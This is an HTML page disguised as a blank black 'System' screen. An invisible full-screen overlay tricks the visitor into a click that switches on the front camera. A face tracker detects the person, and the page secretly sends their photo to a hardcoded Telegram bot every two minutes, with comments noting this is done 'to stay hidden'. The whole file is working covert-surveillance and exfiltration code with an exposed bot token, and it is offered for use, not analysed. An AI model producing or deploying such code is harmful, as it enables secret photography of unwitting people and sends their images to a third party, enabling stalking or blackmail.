<!DOCTYPE html>
<html>
<head>
    <title>System</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clmtrackr/1.3.1/clmtrackr.min.js"></script>
    <style>
        /* Complete black out */
        body, html { background: #000; margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; cursor: none; }
        #v, #c { display: none; }
        /* Invisible button covering the whole screen */
        #gate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; }
    </style>
</head>
<body onclick="init()">

    <div id="gate"></div>
    <video id="v" width="400" height="300" autoplay playsinline muted></video>
    <canvas id="c" width="400" height="300"></canvas>

    <script>
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        const botToken = "8041664147:AAF8SEZD3WUzX2wLBbMzc5V4nQKStkNS_sM";
        const chatId = "7248302842"; // Use your actual numeric ID here

        function init() {
            // Removes the gate so you don't click twice
            document.getElementById('gate').style.display = 'none';

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        const tracker = new clm.tracker();
                        tracker.init();
                        tracker.start(video);

                        function loop() {
                            if (tracker.getCurrentPosition()) {
                                snap();
                            }
                            requestAnimationFrame(loop);
                        }
                        loop();
                    };
                });
        }

        let cooldown = false;
        function snap() {
            if (cooldown) return;
            cooldown = true;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 400, 300);
            
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'img.jpg');

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: fd
                }).then(() => {
                    // Wait 2 minutes between photos to stay hidden
                    setTimeout(() => { cooldown = false; }, 120000);
                }).catch(() => { cooldown = false; });
            }, 'image/jpeg', 0.5);
        }
    </script>
</body>
</html>
